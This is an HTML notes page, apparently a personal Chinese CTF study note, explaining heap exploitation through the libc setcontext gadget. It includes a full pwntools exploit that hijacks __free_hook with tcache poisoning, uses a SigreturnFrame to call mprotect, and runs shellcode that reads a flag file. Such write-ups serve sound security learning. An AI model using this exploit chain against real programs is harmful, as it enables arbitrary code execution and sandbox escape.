<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title># setcontext,setcontext</title>
    <link rel="stylesheet" href="../../../../assets/css/notes.min.css">
</head>
<body>
    <div id="header-placeholder"></div>
    <div class="main-content-wrapper">
        <main class="content">
            <h1>setcontext</h1>
<h2>1.setcontext gadget</h2>
<p>因为要控制程序执行流，而劫持__free_hook为一个函数只能传入特定的rdi参数，所以需要gadget去控制寄存器和栈指针，实现多级操作或者是劫持</p>
<p>或者是讲__free_hook劫持成pop链这种，传入寄存器特定的值，实现调用链条</p>
<p>setcontext 函数是 libc 中一个独特的函数，它的功能是传入一个 SigreturnFrame 结构指针，然后根据 SigreturnFrame 的内容设置各种寄存器。
因此从 setcontext+53（不同 libc 偏移可能不同）的位置开始有如下 gadget，即根据 rdi 也就是第一个参数指向的 SigreturnFrame 结构设置寄存器</p>
<pre><code class="language-shell">0x7f4b45a35a75 &lt;setcontext+53&gt; mov rsp, qword ptr [rdi + 0xa0]
0x7f4b45a35a7c &lt;setcontext+60&gt; mov rbx, qword ptr [rdi + 0x80]
0x7f4b45a35a83 &lt;setcontext+67&gt; mov rbp, qword ptr [rdi + 0x78]
0x7f4b45a35a87 &lt;setcontext+71&gt; mov r12, qword ptr [rdi + 0x48]
0x7f4b45a35a8b &lt;setcontext+75&gt; mov r13, qword ptr [rdi + 0x50]
0x7f4b45a35a8f &lt;setcontext+79&gt; mov r14, qword ptr [rdi + 0x58]
0x7f4b45a35a93 &lt;setcontext+83&gt; mov r15, qword ptr [rdi + 0x60]
0x7f4b45a35a97 &lt;setcontext+87&gt; mov rcx, qword ptr [rdi + 0xa8]
0x7f4b45a35a9e &lt;setcontext+94&gt; push rcx
0x7f4b45a35a9f &lt;setcontext+95&gt; mov rsi, qword ptr [rdi + 0x70]
0x7f4b45a35aa3 &lt;setcontext+99&gt; mov rdx, qword ptr [rdi + 0x88]
0x7f4b45a35aaa &lt;setcontext+106&gt; mov rcx, qword ptr [rdi + 0x98]
0x7f4b45a35ab1 &lt;setcontext+113&gt; mov r8, qword ptr [rdi + 0x28]
0x7f4b45a35ab5 &lt;setcontext+117&gt; mov r9, qword ptr [rdi + 0x30]
0x7f4b45a35ab9 &lt;setcontext+121&gt; mov rdi, qword ptr [rdi + 0x68]
0x7f4b45a35abd &lt;setcontext+125&gt; xor eax, eax
0x7f4b45a35abf &lt;setcontext+127&gt; ret
</code></pre>
<h2>2.setcontext + shellcode</h2>
<p>开启了沙箱保护的堆题，不能执行 execve，所以需要利用 orw 来 getflag，连续的劫持程序流</p>
<p>libc2.27 的简单示例：</p>
<p>在泄露 libc 基地址后在在 __free_hook 处申请堆块并写入如下数据</p>
<p><img src="/0101/PWN/堆利用/BugUsed/assets/6.setcontext/image-20250325002234360.png" alt="image-20250325002234360"></p>
<p>之后释放一个 SigreturnFrame，寄存器设置如下图所示。程序通过 setcontext gadget 设置寄存器后将完成栈迁移，此时会调用 mprotect 函数将 free_hook 所在内存页添加可执行属性并且会将栈迁移至 &amp;free_hook+0x8 的位置。执行完 mprotect 函数后程序将跳转至 shellcode1 执行。shellcode1 会向 __free_hook 所在内存页起始位置读入能 orw 的 shellcode2 并跳转至 shellcode 执行获取 flag</p>
<p><img src="/0101/PWN/堆利用/BugUsed/assets/6.setcontext/image-20250325002334773.png" alt="image-20250325002334773"></p>
<p>跟着exp调试一遍执行流大概就清楚了</p>
<pre><code class="language-c">from pwn import *
# patchelf --set-interpreter new_ld_address file_path
# patchelf --replace-needed old_libc.so.6 new_libc.so.6 file_path
# pycharm # ctrl+/

# local pwn
elf_path = './pwn'
elf = ELF(elf_path)
libc = ELF('./libc.so.6')
context(arch=elf.arch, os=elf.os, log_level=&quot;debug&quot;)
p = process([elf_path])

#-----------------------------------------------------------------------------------------
it      = lambda                    :p.interactive()
sd      = lambda data               :p.send((data))
sa     	= lambda delim,data         :p.sendafter((delim), (data))
sl      = lambda data               :p.sendline((data))
sla     = lambda delim,data         :p.sendlineafter((delim), (data))
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=False :p.recvuntil(delims, drop)
l       = lambda str1               :log.success(str1)
li      = lambda str1,data1         :log.success(str1+' ========&gt; '+hex(data1))
uu32    = lambda data               :u32(data.ljust(4, b&quot;\x00&quot;))
uu64    = lambda data               :u64(data.ljust(8, b&quot;\x00&quot;))
u32Leakbase = lambda offset         :u32(ru(b&quot;\xf7&quot;)[-4:]) - offset
u64Leakbase = lambda offset         :u64(ru(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - offset
#-----------------------------------------------------------------------------------------

def add_chunk(index, size):
    sa(b&quot;choice:\n&quot;, b&quot;1&quot;)
    sa(b&quot;index:\n&quot;, str(index).encode())
    sa(b&quot;size:\n&quot;, str(size).encode())

def delete_chunk(index):
    sa(b&quot;choice:\n&quot;, b&quot;2&quot;)
    sa(b&quot;index:\n&quot;, str(index).encode())

def edit_chunk(index, content):
    sa(b&quot;choice:\n&quot;, b&quot;3&quot;)
    sa(b&quot;index:\n&quot;, str(index).encode())
    sa(b&quot;length:\n&quot;, str(len(content)).encode())
    sa(b&quot;content:\n&quot;, content)

def show_chunk(index):
    sa(b&quot;choice:\n&quot;, b&quot;4&quot;)
    sa(b&quot;index:\n&quot;, str(index).encode())

def exit_p():
    sa(b&quot;choice:\n&quot;, b&quot;5&quot;)

add_chunk(0, 0x500)
add_chunk(1, 0x18)
add_chunk(2,0x18)
delete_chunk(0)
show_chunk(0)
libc.address = u64Leakbase(0x3afca0)
li(&quot;libc.address&quot;, libc.address)

add_chunk(0, 0x400)
delete_chunk(0)
edit_chunk(0, p64(libc.sym['__free_hook']))
add_chunk(1, 0x400)
add_chunk(0, 0x400)

shellcode1 = '''
                xor rdi,rdi
                mov rsi,%d
                mov edx,0x1000
        
                mov eax,0
                syscall
        
                jmp rsi
            ''' % (libc.sym['__free_hook'] &amp; 0xFFFFFFFFFFFFF000)
edit_chunk(0, p64(libc.sym['setcontext'] + 53) + p64(libc.sym['__free_hook'] + 0x10) + asm(shellcode1))

frame = SigreturnFrame()
frame.rsp = libc.sym['__free_hook'] + 8
frame.rip = libc.sym['mprotect']
frame.rdi = libc.sym['__free_hook'] &amp; 0xFFFFFFFFFFFFF000
frame.rsi = 0x2000
frame.rdx = 7

# edit_chunk(1, str(frame))
# edit_chunk(1, frame.__bytes__())
edit_chunk(1, bytes(frame))
#gdb.attach(p, 'b __libc_free')
#pause()
delete_chunk(1)
#pause()
shellcode2 = '''
    mov rax, 0x67616c662f2e ;// ./flag
    push rax
    
    mov rdi, rsp ;// /flag
    mov rsi, 0 ;// O_RDONLY
    xor rdx, rdx ;
    mov rax, 2 ;// SYS_open
    syscall
    
    mov rdi, rax ;// fd 
    mov rsi,rsp  ;
    mov rdx, 1024 ;// nbytes
    mov rax,0 ;// SYS_read
    syscall
    
    mov rdi, 1 ;// fd 
    mov rsi, rsp ;// buf
    mov rdx, rax ;// count 
    mov rax, 1 ;// SYS_write
    syscall
    
    mov rdi, 123 ;// error_code
    mov rax, 60
    syscall
'''
sd(asm(shellcode2))
it()
</code></pre>
<p>注意：这里的 sigframe 发送时使用 <code>bytes(frame)</code> (官方手册的方法) 或者 <code>frame.__bytes__()</code>, 不要使用 <code>str(frame)</code> 方法，会出现错误，不知道为什么原来打 srop 时用 frame 编码时为什么是正确的</p>
<p><img src="/0101/PWN/堆利用/BugUsed/assets/6.setcontext/image-20250325002142396.png" alt="image-20250325002142396"></p>

        </main>
    </div>
    <footer class="footer">
        <p>&copy; 2024 waiwai24. All rights reserved.</p>
    </footer>
    <script src="../../../../assets/js/header.js"></script>
    <script src="../../../../assets/js/include-header.js"></script>
</body>
</html>